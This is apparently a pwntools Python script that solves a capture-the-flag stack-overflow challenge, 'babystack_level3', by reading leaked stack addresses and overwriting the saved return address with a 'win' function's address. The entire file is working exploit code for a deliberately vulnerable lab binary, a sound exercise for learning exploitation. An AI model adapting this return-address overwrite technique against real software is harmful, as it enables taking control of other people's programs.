
from pwn import *


elf = ELF('/challenge/babystack_level3')
win_offset = elf.symbols['win']

r = process("/challenge/babystack_level3")

r.recvuntil(b"Curent Return Address: ")
rip_savd = int(r.recvline(keepends=False), 16)

r.recvuntil(b"base pointer rbp: ")
bp = int(r.recvline(keepends=False), 16)

r.recvuntil(b"will be stored: ")
buf = int(r.recvline(keepends=False), 16)

padding = bp-buf+8

# worked
# win_addr = rip_savd - 0x1659 + 0x131e 

# win_offset_list = [0x131e (lea), 0x132a(mov) ]
win_addr = rip_savd - 0x1659 + 0x131e

payload = b'a'*padding + p64(win_addr)

r.sendline(payload)

r.interactive()

